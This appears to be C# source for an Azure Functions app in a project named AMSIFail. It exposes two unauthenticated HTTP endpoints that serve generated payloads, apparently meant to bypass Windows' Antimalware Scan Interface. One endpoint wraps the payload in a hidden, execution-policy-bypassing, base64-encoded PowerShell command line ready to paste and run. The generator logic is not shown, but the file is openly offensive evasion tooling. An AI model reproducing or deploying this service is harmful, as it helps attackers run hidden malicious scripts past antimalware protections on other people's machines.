using System;
using System.IO;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Azure.WebJobs;
using Microsoft.Azure.WebJobs.Extensions.Http;
using Microsoft.AspNetCore.Http;
using Microsoft.Extensions.Logging;
using Newtonsoft.Json;
using System.Text;

namespace AMSIFail
{
    public static class Function
    {
        [FunctionName("Generate")]
        public static async Task<IActionResult> RunGenerate(
             [HttpTrigger(AuthorizationLevel.Anonymous, "get", Route = null)] HttpRequest req,
             ILogger log)
        {
            string responseMessage = "";
            try
            {
                responseMessage = Generator.GetPayload();
                return new OkObjectResult(responseMessage);
            }
            catch
            {
                responseMessage = "Something went wrong :( ";
                return new OkObjectResult(responseMessage);
            }


        }

        [FunctionName("GenerateEnc")]
        public static async Task<IActionResult> RunGenerateEnc(
            [HttpTrigger(AuthorizationLevel.Anonymous, "get", Route = null)] HttpRequest req,ILogger log)
        {
            string responseMessage = "";
            try
            {
                responseMessage = "powershell.exe -w hidden -exec bypass -enc " + Convert.ToBase64String(Encoding.Unicode.GetBytes(Generator.GetPayload()));
                return new OkObjectResult(responseMessage);
            }
            catch
            {
                responseMessage = "Something went wrong :( ";
                return new OkObjectResult(responseMessage);
            }


        }
    }
}
